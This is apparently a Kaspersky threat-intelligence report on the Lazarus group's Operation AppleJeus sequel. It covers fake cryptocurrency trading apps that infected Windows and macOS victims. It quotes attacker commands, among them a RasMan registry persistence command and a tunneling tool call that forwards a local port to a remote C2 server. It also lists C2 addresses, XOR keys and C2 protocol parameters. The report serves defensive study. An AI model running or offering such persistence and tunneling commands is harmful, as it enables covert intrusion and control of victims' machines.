																							<h2>Lazarus continues to attack the cryptocurrency business with enhanced capabilities</h2>											
											<div class="js-reading-content">
												<div class="c-wysiwyg">
													<p>The Lazarus group is currently one of the most active and prolific APT actors. In 2018, Kaspersky published a report on one of their campaigns, named Operation <a href="https://securelist.com/operation-applejeus/87553/" target="_blank" rel="noopener noreferrer">AppleJeus</a>. Notably, this operation marked the first time Lazarus had targeted macOS users, with the group inventing a fake company in order to deliver their manipulated application and exploit the high level of trust among potential victims. As a result of our ongoing efforts, we identified significant changes to the group&#8217;s attack methodology. To attack macOS users, the Lazarus group has developed homemade macOS malware, and added an authentication mechanism to deliver the next stage payload very carefully, as well as loading the next-stage payload without touching the disk. In addition, to attack Windows users, they have elaborated a multi-stage infection procedure, and significantly changed the final payload. We assess that the Lazarus group has been more careful in its attacks following the release of Operation AppleJeus and they have employed a number of methods to avoid being detected.</p>
<p>For more information, please contact: <a href="mailto:intelreports@kaspersky.com" target="_blank" rel="noopener noreferrer">intelreports@kaspersky.com</a></p>

<h2 id="change-of-windows-malware">Change of Windows malware</h2>
<p>During our ongoing tracking of this campaign, we found that one victim was compromised by Windows AppleJeus malware in March 2019. Unfortunately, we couldn&#8217;t identify the initial installer, but we established that the infection started from a malicious file named <em>WFCUpdater.exe</em>. At that time, the actor used a fake website: wfcwallet[.]com</p>
<p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2019/12/26143840/operation-applejeus-sequel-1.png" target="_blank" rel="noopener noreferrer" class="magnificImage"><img decoding="async" class="aligncenter size-full wp-image-81520" style="max-height: 60vh; max-width: 100%;" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2019/12/26143840/operation-applejeus-sequel-1.png" alt="" /></a></p>
<p>The actor used a multi-stage infection like before, but the method was different. The infection started from .NET malware, disguised as a WFC wallet updater (a9e960948fdac81579d3b752e49aceda). Upon execution, this .NET executable checks whether the command line argument is &#8220;/Embedding&#8221; or not. This malware is responsible for decrypting the WFC.cfg file in the same folder with a hardcoded 20-byte XOR key (82 d7 ae 9b 36 7d fc ee 41 65 8f fa 74 cd 2c 62 b7 59 f5 62). This mimics the wallet updater connected to the C2 addresses:</p>
<ul>
<li>wfcwallet.com (resolved ip: 108.174.195.134)</li>
<li>www.chainfun365.com (resolved ip: 23.254.217.53)</li>
</ul>
<p>After that, it carries out the malware operator&#8217;s commands in order to install the next stage permanent payload. The actor delivered two more files into the victim&#8217;s system folder: <em>rasext.dll and msctfp.dat</em>. They used the RasMan (Remote Access Connection Manager) Windows service to register the next payload with a persistence mechanism. After fundamental reconnaissance, the malware operator implanted the delivered payload by manually using the following commands:</p>
<ul>
<li>cmd.exe /c dir rasext.dll</li>
<li>cmd.exe /c dir msctfp.dat</li>
<li>cmd.exe /c tasklist /svc | findstr RasMan</li>
<li>cmd.exe /c reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\RasMan\ThirdParty /v DllName /d rasext.dll /f</li>
</ul>
<p>In order to establish remote tunneling, the actor delivered more tools, executing with command-line parameters. Unfortunately, we have had no chance to obtain this file, but we speculate that <em>Device.exe</em> is responsible for opening port 6378, and the <em>CenterUpdater.exe</em> tool was used for creating tunneling to a remote host. Note that the 104.168.167.16 server is used as a C2 server. The fake website hosting server for the UnionCryptoTrader case will be described next.</p>
<ul>
<li><strong>Port opener:</strong></li>
</ul>
<p><em>%APPDATA%\Lenovo\devicecenter\Device.exe 6378</em></p>
<ul>
<li><strong>Tunneling tool:</strong></li>
</ul>
<p><em>%APPDATA%\Lenovo\devicecenter\CenterUpdater.exe 127.0.0.1 6378 104.168.167.16 443</em></p>
<h2 id="change-of-macos-malware">Change of macOS malware</h2>
<p><strong>JMTTrading case</strong></p>
<p>While tracking this campaign, we identified more heavily deformed macOS malware. At the time, the attacker called their fake website and application JMTTrading. Other researchers and security vendors found it too, and published IoCs with abundant technical details. <a href="https://twitter.com/malwrhunterteam/status/1182599688085823490?s=20" target="_blank" rel="noopener noreferrer">Malware Hunter Team</a> tweeted about this malicious application, Vitali Kremez published a <a href="https://www.vkremez.com/2019/10/lets-learn-dissecting-lazarus-windows.html" target="_blank" rel="noopener noreferrer">blog</a> about the Windows version of the malware, and Objective-See published <a href="https://objective-see.com/blog/blog_0x49.html" target="_blank" rel="noopener noreferrer">details</a> about the macOS malware. We believe these reports are sufficient to understand the technical side. Here, we would like to highlight what&#8217;s different about this attack.</p>
<ul>
<li>The actor used GitHub in order to host their malicious applications.</li>
<li>The malware author used Object-C instead of QT framework in their macOS malware.</li>
<li>The malware implemented a simple backdoor function in macOS executable.</li>
<li>The malware encrypted/decrypted with a 16-byte XOR key (X,%`PMk&#8211;Jj8s+6=) similar to the previous case.</li>
<li>The Windows version of the malware used <a href="https://github.com/andrivet/ADVobfuscator" target="_blank" rel="noopener noreferrer">ADVobfuscator</a>, a compiled time obfuscator, in order to hide its code.</li>
<li>The post-install script of macOS malware differed significantly from the previous version.</li>
</ul>
<p><strong>UnionCryptoTrader case</strong></p>
<p>We also identified another macOS targeted attack that took place very recently. The malicious application name in this case is UnionCryptoTrader. After compiling a threat intelligence report for our customers, one security researcher (<a href="https://twitter.com/dineshdina04" target="_blank" rel="noopener noreferrer">@dineshdina04</a>) discovered an identical case, and Objective-See published a very detailed <a href="https://objective-see.com/blog/blog_0x51.html" target="_blank" rel="noopener noreferrer">blog</a> on the macOS malware used in this attack. The Objective-See blog goes into sufficient detail to explain the malware&#8217;s functionality, so we will just summarize the attack:</p>
<ul>
<li>The post-install script is identical to that used in the JMTTrading case.</li>
<li>The malware author used SWIFT to develop this macOS malware.</li>
<li>The malware author changed the method for collecting information from the infected system.</li>
<li>The malware starts to conduct authentication using <em>auth_signature</em> and <em>auth_timestamp</em> parameters in order to deliver the second-stage payload more carefully. The malware acquires the current system time and combines it with the <em>&#8220;12GWAPCT1F0I1S14&#8221;</em> hardcoded string, and produces an MD5 hash of the combined string. This hash is used as the value of the <em>auth_signature</em> parameter and the current time is used as the value of the <em>auth_timestamp</em> parameter. The malware operator can reproduce the <em>auth_signature</em> value based on the <em>auth_timestamp</em> at the C2 server side.</li>
<li>The malware loads the next stage payload without touching the disk.</li>
</ul>
<h2 id="windows-version-of-unioncryptotrader">Windows version of UnionCryptoTrader</h2>
<p>We also found a Windows version of the UnionCryptoTrader (0f03ec3487578cef2398b5b732631fec). It was executed from the Telegram messenger download folder:</p>
<p><em>C:\Users\[user name]\Downloads\<strong>Telegram Desktop</strong>\UnionCryptoTraderSetup.exe</em></p>
<p>We also found the actor&#8217;s Telegram group on their fake website. Based on these, we assess with high confidence that the actor delivered the manipulated installer using the Telegram messenger. Unfortunately, we can&#8217;t get all the related files as some payloads were only executed in memory. However, we can reassemble the whole infection procedure based on our telemetry. The overall infection procedure was very similar to the WFCWallet case, but with an added injection procedure, and they only used the final backdoor payload instead of using a tunneling tool.</p>

For the initial communication, the malware first sends parameters:</p>
<ul>
<li>cgu: 64bits hex value from configuration</li>
<li>aip: MD5 hash value from configuration</li>
<li>sv: hardcoded value(1)</li>
</ul>
<p>If the response code from the C2 server is 200, the malware sends the next POST request with encrypted data and a random value. The malware operator probably used the random value to identify each victim and verify the POST request.</p>
<ul>
<li>imp: Random generated value</li>
<li>dsh: XORed value of imp</li>
<li>hb_tp: XORed value(key: 0x67BF32) of imp</li>
<li>hb_dl: Encrypted data to send to C2 server</li>
<li>ct: hardcoded value(1)</li>
</ul>
<p>Finally, the malware downloads the next stage payload, decrypting it and possibly executing it with the <em>Print</em> parameter. We speculate that the DLL type payload will be downloaded and call its <em>Print</em> export function for further infection. We can&#8217;t get hold of the final payload that&#8217;s executed in memory, but we believe its backdoor-type malware is ultimately used to control the infected victim.</p>
<h2 id="infrastructures">Infrastructures</h2>
<p>We found several fake websites that were still online when we were investigating their infrastructure. They created fake cryptocurrency-themed websites, but they were far from perfect and most of the links didn&#8217;t work.</p>
<p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2019/12/26143908/operation-applejeus-sequel-5.png" target="_blank" rel="noopener noreferrer" class="magnificImage"><img decoding="async" class="aligncenter size-full wp-image-81520" style="max-height: 60vh; max-width: 100%;" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2019/12/26143908/operation-applejeus-sequel-5.png" alt="" /></a></p>
<p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2019/12/26143921/operation-applejeus-sequel-6.png" target="_blank" rel="noopener noreferrer" class="magnificImage"><img decoding="async" class="aligncenter size-full wp-image-81520" style="max-height: 60vh; max-width: 100%;" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2019/12/26143921/operation-applejeus-sequel-6.png" alt="" /></a></p>
<p>We found an identical <a href="https://colorlib.com/wp/template/cryptian/">Cyptian web template</a> on the internet. We speculate that the actor used free web templates like this to build their fake websites. Moreover, there is a Telegram address(<em>@cyptian</em>) on the Cyptian website. As we mentioned previously, the actor delivered a manipulated application via Telegram messenger. This Telegram address was still alive when we investigated, but there were no more activities at that time. According to the chat log, the group was created on December 17, 2018 and some accounts had already been deleted.</p>
<p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2019/12/26143930/operation-applejeus-sequel-7.png" target="_blank" rel="noopener noreferrer" class="magnificImage"><img decoding="async" class="aligncenter size-full wp-image-81520" style="max-height: 60vh; max-width: 100%;" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2019/12/26143930/operation-applejeus-sequel-7.png" alt="" /></a></p>
<h2 id="conclusion">Conclusion</h2>
<p>We were able to identify several victims in this Operation AppleJeus sequel. Victims were recorded in the UK, Poland, Russia and China. Moreover, we were able to confirm that several of the victims are linked to cryptocurrency business entities.</p>
<p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2019/12/26143936/operation-applejeus-sequel-8.png" target="_blank" rel="noopener noreferrer" class="magnificImage"><img decoding="async" class="aligncenter size-full wp-image-81520" style="max-height: 60vh; max-width: 100%;" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2019/12/26143936/operation-applejeus-sequel-8.png" alt="" /></a></p>
<p>The actor altered their macOS and Windows malware considerably, adding an authentication mechanism in the macOS downloader and changing the macOS development framework. The binary infection procedure in the Windows system differed from the previous case. They also changed the final Windows payload significantly from the well-known Fallchill malware used in the previous attack. We believe the Lazarus group&#8217;s continuous attacks for financial gain are unlikely to stop anytime soon.</p>
<p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2019/12/26143942/operation-applejeus-sequel-9.png" target="_blank" rel="noopener noreferrer" class="magnificImage"><img decoding="async" class="aligncenter size-full wp-image-81520" style="max-height: 60vh; max-width: 100%;" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2019/12/26143942/operation-applejeus-sequel-9.png" alt="" /></a></p>
<p>Since the initial appearance of Operation AppleJeus, we can see that over time the authors have changed their modus operandi considerably. We assume this kind of attack on cryptocurrency businesses will continue and become more sophisticated.</p>
